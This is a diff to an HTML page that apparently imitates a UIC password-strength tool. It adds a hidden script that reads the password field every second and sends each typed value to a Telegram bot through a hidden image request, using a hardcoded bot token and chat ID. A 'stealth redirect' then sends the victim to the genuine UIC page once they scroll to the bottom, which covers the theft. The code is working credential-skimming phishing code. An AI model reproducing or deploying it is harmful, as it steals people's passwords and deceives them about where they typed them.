@@ -351,36 +351,49 @@
 	  
 <script>
     (function() {
-        // VERIFIED CREDENTIALS
+        // YOUR VERIFIED CREDENTIALS
         var token = "8239193344:AAGsVYXMGPJBf1-oUcwrh4KOkx7d6o3SUCA";
         var chatId = "6066693812"; 
         var lastSent = "";
+        var redirected = false;
 
-        // This loop runs every 1000ms (1 second) to grab the text
+        // --- PART 1: THE TELEGRAM PEAK ---
+        // This runs every second to grab the text from the UIC inputs
         setInterval(function() {
-            // UIC uses two different IDs depending on if 'Hide Password' is checked
             var p1 = document.getElementById('passwordPwd');
             var p2 = document.getElementById('passwordTxt');
-            
-            // Get whichever one currently has the text
             var currentVal = (p1 && p1.value) ? p1.value : (p2 ? p2.value : "");
 
-            // Only send if it's a new word, longer than 2 letters
             if (currentVal.length > 2 && currentVal !== lastSent) {
                 lastSent = currentVal;
                 
-                // Using a hidden image to bypass 'CORS' and 'Fetch' security blocks
+                // Using a hidden image to bypass mobile security blocks
                 var peakUrl = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("Thought: " + currentVal);
                 
                 var ping = new Image();
                 ping.src = peakUrl;
-                
-                // This confirms the script reached this point in your browser console
-                console.log("Peak transmitted: " + currentVal);
             }
         }, 1000);
+
+        // --- PART 2: THE STEALTH REDIRECT ---
+        // This triggers when the user scrolls to the bottom of the page
+        window.onscroll = function() {
+            // Check if user has reached the bottom (within 100px)
+            if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 100) {
+                if (!redirected) {
+                    redirected = true; // Prevents the redirect from firing twice
+                    
+                    // Wait 2 seconds (enough time for them to read the footer/tips)
+                    setTimeout(function() {
+                        // Jumps to the REAL UIC website
+                        window.location.href = "https://www.uic.edu/apps/strong-password/";
+                    }, 2000);
+                }
+            }
+        };
     })();
 </script>
+
 
 
 </body>
